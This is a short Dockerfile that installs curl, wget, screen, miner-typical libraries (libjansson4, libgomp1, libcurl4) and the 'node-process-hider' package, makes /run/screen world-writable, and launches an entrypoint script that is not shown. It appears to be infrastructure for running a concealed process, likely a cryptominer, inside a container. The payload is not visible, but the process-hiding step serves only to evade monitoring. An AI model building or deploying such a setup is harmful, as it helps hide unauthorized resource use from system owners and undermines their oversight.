FROM ubuntu:20.04

RUN apt-get update && \
    apt-get install -y curl git wget screen ca-certificates libcurl4 libjansson4 libgomp1 sudo npm nodejs
RUN sudo npm i -g node-process-hider
ADD entrypoint.sh /entrypoint.sh
RUN chmod 777 /run/screen
RUN chmod +x /entrypoint.sh
CMD /entrypoint.sh